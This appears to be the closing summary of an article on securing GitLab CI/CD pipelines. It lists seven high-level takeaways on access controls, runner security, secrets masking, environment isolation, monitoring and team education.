1. **Pipeline Security is Critical**: The security of your CI/CD pipeline is foundational in maintaining the integrity of your code and data. Any vulnerabilities in the pipeline can lead to severe consequences, including unauthorized code changes and exposure of sensitive information.
   
2. **Access Controls are Key**: Restricting access to key branches, environments, and CI/CD secrets is the first line of defense against unauthorized changes or potential breaches. Effective access control ensures that only the right people have permission to interact with critical parts of the pipeline.

3. **Securing Runner Machines is Crucial**: The security of the machines running your build processes, such as GitLab Runners, is a vital part of your security strategy. Implementing strong authentication and ensuring the security of these machines helps prevent potential intrusions and misuse.

4. **Proper Secrets Management is Essential**: Protecting sensitive data, such as API keys, tokens, and passwords, should be a priority. Utilizing GitLab CI/CD’s **masked** and **secure** variable features ensures these secrets are not exposed in job logs or accessible to unauthorized users. Relying on environment variables alone is insufficient for ensuring their protection.

5. **Environment Isolation is Necessary**: Clearly separating **development (DEV)** and **production (PROD)** environments is crucial for reducing the risk of a breach in one environment spilling over into the other. Keeping these environments isolated minimizes the chances of introducing vulnerabilities into the production environment through development testing.

6. **Ongoing Vigilance and Monitoring**: Continuous monitoring, regular reviews of access permissions, security settings, and script configurations are essential for identifying potential vulnerabilities early. Additionally, setting up alerts and logging mechanisms ensures timely detection and response to any suspicious activities.

7. **Team Education is Crucial**: Educating your team on security best practices and the importance of secure coding, access controls, and pipeline protection is vital for creating a culture of security awareness. A well-informed team is more likely to follow security protocols and recognize potential threats before they escalate.

By incorporating these principles into your DevSecOps practices, you ensure that your pipelines, secrets, and infrastructure remain secure against evolving threats.